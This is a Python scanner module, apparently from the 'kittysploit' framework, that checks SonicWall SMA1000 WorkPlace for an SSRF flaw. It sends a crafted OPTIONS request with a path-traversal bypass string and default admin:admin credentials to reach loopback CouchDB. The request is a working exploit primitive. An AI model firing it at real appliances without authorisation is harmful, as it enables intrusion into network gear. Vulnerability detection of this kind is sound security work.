#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detect SonicWall SMA1000 CVE-2026-83548 WorkPlace SSRF to CouchDB."""

import http.client
import json
import secrets
import ssl

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "SonicWall SMA1000 CVE-2026-83548 SSRF Detect",
        "description": (
            "Detects CVE-2026-83548 in SonicWall SMA1000 WorkPlace before hotfixes "
            "12.4.3-03526 / 12.5.0-02952. Sends an unauthenticated absolute-form "
            "OPTIONS request that WorkPlace forwards to loopback CouchDB; a 405 "
            "method_not_allowed JSON body confirms the SSRF primitive."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2026-83548"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-83548",
            "https://www.sonicwall.com/support/notices/product-notice-sma-1000-series-affected-by-multiple-vulnerabilities-snwlid-2026-0016/kA1VN000002AXmQ0AW",
        ],
        "modules": [
            "scanner/http/sonicwall_sma1000_cve_2026_83549_detect",
        ],
        "tags": [
            "web",
            "scanner",
            "sonicwall",
            "sma1000",
            "ssrf",
            "couchdb",
            "cve-2026-83548",
            "kev",
            "vuln",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe", "active_exploitation"],
            "expected_requests": 2,
            "reversible": True,
            "approval_required": True,
            "produces": ["tech_hints", "risk_signals", "exploit_paths"],
            "cost": 1.3,
            "noise": 0.4,
            "value": 1.2,
            "requires": {
                "tech_hints_any": ["sonicwall", "sma"],
                "endpoint_pattern_any": ["/workplace", "/__extraweb__"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "ssrf", "from_detail": "WorkPlace forward proxy"},
                ],
                "suggested_followups": [
                    "scanner/http/sonicwall_sma_detect",
                ],
            },
        },
    }

    port = OptPort(443, "SMA1000 WorkPlace HTTPS port", True)
    ssl = OptBool(True, "Use HTTPS", True, advanced=True)

    def _origin(self) -> str:
        scheme = "https" if bool(self.ssl) else "http"
        return f"{scheme}://{self.target}:{int(self.port)}"

    def _couch_ssrf(self) -> tuple[bool, str]:
        token_a = secrets.token_hex(4)
        token_b = secrets.token_hex(4)
        bypass = f"{secrets.token_hex(4)}={secrets.token_hex(4)}/{'../' * 12}__extraweb__"
        absolute_uri = (
            f"http://127.0.0.1:5984/__EXTRAWEB__TRANSLATE/{token_a}\\{token_b}/../.."
            f"/_up?{bypass}"
        )
        host = str(self.target or "")
        port = int(self.port or 443)
        use_ssl = bool(self.ssl)
        headers = {
            "Host": f"{host}:{port}",
            "Origin": self._origin().rstrip("/"),
            "Access-Control-Request-Method": "GET",
            "Authorization": "Basic YWRtaW46YWRtaW4=",
            "Content-Type": "application/json",
            "Connection": "close",
        }
        try:
            if use_ssl:
                context = ssl._create_unverified_context()
                conn = http.client.HTTPSConnection(host, port, timeout=int(self.timeout or 20), context=context)
            else:
                conn = http.client.HTTPConnection(host, port, timeout=int(self.timeout or 20))
            conn.request("OPTIONS", absolute_uri, headers=headers)
            raw = conn.getresponse()
            body = raw.read().decode("utf-8", errors="replace")
            code = int(raw.status or 0)
            conn.close()
        except Exception as exc:
            return False, f"request failed: {exc}"
        try:
            payload = json.loads(body)
        except Exception:
            payload = {}
        if code == 405 and isinstance(payload, dict) and payload.get("error") == "method_not_allowed":
            return True, "CouchDB method_not_allowed via WorkPlace SSRF"
        server = str(raw.headers.get("Server") or "")
        if server.upper().startswith("SMA/"):
            return False, f"SMA responded without SSRF (HTTP {code})"
        return False, f"unexpected response HTTP {code}"

    def run(self):
        root = self.http_request(method="GET", path="/workplace/home.action", allow_redirects=True)
        body = (root.text or "") if root else ""
        if root and int(root.status_code or 0) == 200:
            if not any(token in body for token in ("SonicWall", "/__extraweb__/")):
                root = None
        if not root:
            root = self.http_request(method="GET", path="/", allow_redirects=True)
            body = (root.text or "") if root else ""
            if "SonicWall" not in body and "SMA/" not in str((root.headers or {}).get("Server") or ""):
                return False

        ok, detail = self._couch_ssrf()
        if ok:
            self.set_info(
                severity="critical",
                cve="CVE-2026-83548",
                reason=detail,
                path="/workplace (OPTIONS absolute-form SSRF)",
            )
            return True
        return False
